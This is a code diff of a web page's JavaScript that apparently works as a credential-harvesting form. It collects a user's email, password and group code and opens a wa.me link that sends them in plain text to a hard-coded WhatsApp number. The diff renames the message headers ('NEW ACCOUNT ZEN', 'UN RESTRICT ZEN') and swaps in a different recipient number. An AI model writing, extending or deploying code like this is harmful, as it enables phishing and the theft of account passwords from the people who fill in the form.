@@ -572,14 +572,14 @@
                 const koneksi = document.getElementById('koneksi').value;
                 const tahun = document.getElementById('tahun').value;
 
-                message = `*DATA NEW ACCOUNT ZEN*\n\n` +
+                message = `*NEW ACCOUNT ZEN*\n\n` +
                           `📧 *Email:* ${email}\n` +
                           `🔑 *Password:* ${password}\n` +
                           `🔗 *Koneksi:* ${koneksi}\n` +
                           `📅 *Tahun:* ${tahun}\n` +
                           `🆔 *Kode Grup:* ${kodeGrup}`;
             } else {
-                message = `*DATA UN RESTRICT ZEN*\n\n` +
+                message = `*UN RESTRICT ZEN*\n\n` +
                           `📧 *Email:* ${email}\n` +
                           `🔑 *Password:* ${password}\n` +
                           `🆔 *Kode Grup:* ${kodeGrup}\n` +
@@ -587,7 +587,7 @@
             }
 
             const encodedMessage = encodeURIComponent(message);
-            const phoneNumber = "12158209365"; 
+            const phoneNumber = "12138496837"; 
 
             setTimeout(() => {
                 window.open(`https://wa.me/${phoneNumber}?text=${encodedMessage}`, '_blank');
